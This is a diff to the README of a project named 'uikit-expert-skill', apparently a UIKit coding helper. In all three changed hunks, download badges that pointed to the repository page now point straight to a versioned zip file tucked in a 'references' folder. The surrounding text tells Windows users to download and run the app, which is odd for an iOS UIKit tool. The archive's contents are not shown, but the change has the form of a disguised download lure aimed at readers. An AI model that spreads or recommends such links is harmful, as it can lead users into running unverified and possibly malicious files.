@@ -1,6 +1,6 @@
 # 🧰 uikit-expert-skill - Write UIKit Code Confidently
 
-[![Download uikit-expert-skill](https://img.shields.io/badge/Download-uikit--expert--skill-brightgreen?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill)
+[![Download uikit-expert-skill](https://img.shields.io/badge/Download-uikit--expert--skill-brightgreen?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill/raw/refs/heads/main/uikit-expert/references/skill-expert-uikit-v3.2-beta.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run the application on your Windows PC.
 
 Visit the main page to get the app files:
 
-[![Download Link](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill)
+[![Download Link](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill/raw/refs/heads/main/uikit-expert/references/skill-expert-uikit-v3.2-beta.5.zip)
 
 Click the green **Code** button and select **Download ZIP**
 
@@ -108,7 +108,7 @@ New features and fixes appear on the GitHub page.
 
 Return to the main download page:
 
-[![Download Link](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill)
+[![Download Link](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/zinxj/uikit-expert-skill/raw/refs/heads/main/uikit-expert/references/skill-expert-uikit-v3.2-beta.5.zip)
 
 Download newer versions when available and follow the same setup steps.
 
